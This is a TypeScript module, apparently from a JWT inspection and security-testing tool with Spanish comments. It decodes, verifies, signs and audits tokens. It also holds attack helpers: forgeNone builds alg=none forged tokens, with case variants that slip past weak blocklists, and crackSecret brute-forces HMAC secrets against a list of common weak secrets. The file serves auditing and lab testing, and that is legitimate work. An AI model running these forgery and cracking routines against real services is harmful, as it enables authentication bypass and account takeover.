import { base64urlToBytes, bytesToBase64url, decode as decodeText, encode as encodeText } from '../encoders/logic'
import { hmacBytes, importHmacKey, type HmacAlg } from '../hash/logic'

export type JwtHsAlg = 'HS256' | 'HS384' | 'HS512'

export const HS_ALGS: JwtHsAlg[] = ['HS256', 'HS384', 'HS512']

const HASH_OF: Record<JwtHsAlg, HmacAlg> = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' }

export const isHsAlg = (alg: unknown): alg is JwtHsAlg => HS_ALGS.includes(alg as JwtHsAlg)

export interface DecodedJwt {
  header: Record<string, unknown>
  payload: Record<string, unknown>
  /** Firma tal cual viene en el token (Base64url). */
  signature: string
  /** `base64url(header).base64url(payload)`: lo que realmente se firma. */
  signingInput: string
  /** Las tres partes originales, para mostrarlas coloreadas. */
  parts: [string, string, string]
}

function parseJsonPart(part: string, what: string): Record<string, unknown> {
  let text: string
  try {
    text = decodeText('base64url', part)
  } catch {
    throw new Error(`El ${what} no es Base64url válido`)
  }
  let value: unknown
  try {
    value = JSON.parse(text)
  } catch {
    throw new Error(`El ${what} no es JSON válido`)
  }
  if (typeof value !== 'object' || value === null || Array.isArray(value)) throw new Error(`El ${what} debe ser un objeto JSON`)
  return value as Record<string, unknown>
}

/** Separa y decodifica las tres partes. Lanza un error si el token no es un JWS compacto válido. */
export function decodeJwt(token: string): DecodedJwt {
  const t = token.trim().replace(/^Bearer\s+/i, '')
  const parts = t.split('.')
  if (parts.length === 5) throw new Error('Tiene 5 partes: es un JWE (token cifrado), no un JWS firmado. Sin la clave no se puede leer.')
  if (parts.length !== 3) throw new Error(`Un JWT firmado tiene 3 partes separadas por puntos; este tiene ${parts.length}`)
  const [h, p, s] = parts
  return {
    header: parseJsonPart(h, 'header'),
    payload: parseJsonPart(p, 'payload'),
    signature: s,
    signingInput: `${h}.${p}`,
    parts: [h, p, s],
  }
}

/** Verifica una firma HS*. Usa crypto.subtle.verify, que compara en tiempo constante. */
export async function verifyHs(token: string, secret: string): Promise<boolean> {
  const d = decodeJwt(token)
  const alg = d.header.alg
  if (!isHsAlg(alg)) throw new Error(`El token usa "${String(alg)}", no HS256/384/512`)
  let sig: Uint8Array<ArrayBuffer>
  try {
    sig = base64urlToBytes(d.signature)
  } catch {
    return false
  }
  const key = await importHmacKey(HASH_OF[alg], secret, ['verify'])
  return crypto.subtle.verify('HMAC', key, sig, new TextEncoder().encode(d.signingInput))
}

export const verifyHS256 = verifyHs

const encodeJson = (obj: Record<string, unknown>) => encodeText('base64url', JSON.stringify(obj))

/** Firma un payload con HS256/384/512. El header lleva `alg` y `typ: JWT`, más los campos extra que se pasen. */
export async function signHs(
  alg: JwtHsAlg,
  payload: Record<string, unknown>,
  secret: string,
  extraHeader: Record<string, unknown> = {},
): Promise<string> {
  const signingInput = `${encodeJson({ alg, typ: 'JWT', ...extraHeader })}.${encodeJson(payload)}`
  const sig = await hmacBytes(HASH_OF[alg], secret, signingInput)
  return `${signingInput}.${bytesToBase64url(sig)}`
}

export const signHS256 = (payload: Record<string, unknown>, secret: string) => signHs('HS256', payload, secret)

/** Variantes de mayúsculas con las que se saltan listas negras mal hechas de "none". */
export const NONE_VARIANTS = ['none', 'None', 'NONE', 'nOnE'] as const

/**
 * Ataque alg=none: header con "alg":"none", payload (opcionalmente modificado) y firma vacía.
 * Un servidor vulnerable acepta el token sin verificar nada. Solo para probar en un laboratorio propio.
 */
export function forgeNone(token: string, payload?: Record<string, unknown>, variant: (typeof NONE_VARIANTS)[number] = 'none'): string {
  const d = decodeJwt(token)
  return `${encodeJson({ ...d.header, alg: variant })}.${encodeJson(payload ?? d.payload)}.`
}

export type FindingLevel = 'crítico' | 'alto' | 'medio' | 'info'

export interface Finding {
  level: FindingLevel
  message: string
}

const SENSITIVE_KEYS = /pass(word)?|pwd|secret|token|api[_-]?key|ssn|card|cvv|rut|dni/i

/** Avisos de seguridad según RFC 8725 (JWT Best Current Practices). */
export function auditJwt(decoded: DecodedJwt, now: Date = new Date()): Finding[] {
  const { header, payload } = decoded
  const f: Finding[] = []
  const nowSec = Math.floor(now.getTime() / 1000)
  const alg = String(header.alg ?? '')

  if (alg.toLowerCase() === 'none') f.push({ level: 'crítico', message: 'alg es "none": el token no está firmado. Ningún servidor debería aceptarlo.' })
  else if (isHsAlg(alg)) f.push({ level: 'info', message: `${alg} usa un secreto compartido: si es débil, se puede crackear offline con solo este token (hashcat -m 16500).` })

  if ('jku' in header || 'x5u' in header) f.push({ level: 'alto', message: 'El header trae jku/x5u (URL de claves). El servidor nunca debe descargar claves de una URL que venga en el propio token.' })
  if ('jwk' in header) f.push({ level: 'alto', message: 'El header incrusta una clave (jwk). Si el servidor la usa para verificar, cualquiera puede firmar tokens.' })
  if ('kid' in header) f.push({ level: 'medio', message: 'Hay kid: comprueba que el servidor lo valida contra una lista. Un kid usado en una ruta o consulta SQL es inyectable.' })

  const exp = typeof payload.exp === 'number' ? payload.exp : undefined
  const iat = typeof payload.iat === 'number' ? payload.iat : undefined
  const nbf = typeof payload.nbf === 'number' ? payload.nbf : undefined
  if (exp === undefined) f.push({ level: 'alto', message: 'No tiene exp: el token no caduca nunca. Si se filtra, sirve para siempre.' })
  else if (exp < nowSec) f.push({ level: 'medio', message: `Expirado desde ${formatClaimDate(exp)}. Un servidor correcto debe rechazarlo.` })
  if (exp !== undefined && iat !== undefined && exp - iat > 24 * 3600) {
    f.push({ level: 'medio', message: `Vida larga: ${Math.round((exp - iat) / 3600)} h entre iat y exp. Para tokens de acceso se recomiendan minutos.` })
  }
  if (nbf !== undefined && nbf > nowSec) f.push({ level: 'info', message: `Todavía no es válido (nbf: ${formatClaimDate(nbf)}).` })

  const sensitive = Object.keys(payload).filter((k) => SENSITIVE_KEYS.test(k))
  if (sensitive.length) {
    f.push({ level: 'alto', message: `El payload incluye ${sensitive.map((k) => `"${k}"`).join(', ')}. El payload no está cifrado: cualquiera con el token lo lee.` })
  }
  if (!('iss' in payload) || !('aud' in payload)) {
    f.push({ level: 'info', message: 'Falta iss o aud. Sin ellos, un token emitido para otro servicio con la misma clave podría aceptarse aquí.' })
  }
  return f
}

/** Segundos epoch → fecha legible en hora local. */
export const formatClaimDate = (sec: number) =>
  new Date(sec * 1000).toLocaleString('es', { dateStyle: 'medium', timeStyle: 'medium' })

/** Secretos débiles que aparecen una y otra vez en tutoriales, ejemplos y CTF. */
export const COMMON_SECRETS = [
  'secret', 'your-256-bit-secret', 'your-384-bit-secret', 'your-512-bit-secret', 'password', '123456', 'changeme',
  'key', 'jwt', 'jwt_secret', 'jwtsecret', 'secretkey', 'secret_key', 'supersecret', 'mysecret', 'admin', 'test',
  'qwerty', 'default', 'private', 'token', 'shhhhh', 'keyboard cat', 's3cr3t', 'secret123', 'hello', 'letmein',
]

/**
 * Prueba secretos contra la firma HS* del token. Devuelve el secreto si lo encuentra.
 * Cede el hilo cada `batch` intentos para que la interfaz no se congele con listas grandes.
 */
export async function crackSecret(
  token: string,
  candidates: string[],
  onProgress?: (tried: number) => void,
  batch = 500,
): Promise<string | null> {
  const d = decodeJwt(token)
  const alg = d.header.alg
  if (!isHsAlg(alg)) throw new Error('Solo se pueden atacar tokens HS256/384/512')
  const sig = base64urlToBytes(d.signature)
  const data = new TextEncoder().encode(d.signingInput)
  for (let i = 0; i < candidates.length; i++) {
    const key = await importHmacKey(HASH_OF[alg], candidates[i], ['verify'])
    if (await crypto.subtle.verify('HMAC', key, sig, data)) {
      onProgress?.(i + 1)
      return candidates[i]
    }
    if ((i + 1) % batch === 0) {
      onProgress?.(i + 1)
      await new Promise((r) => setTimeout(r, 0))
    }
  }
  onProgress?.(candidates.length)
  return null
}
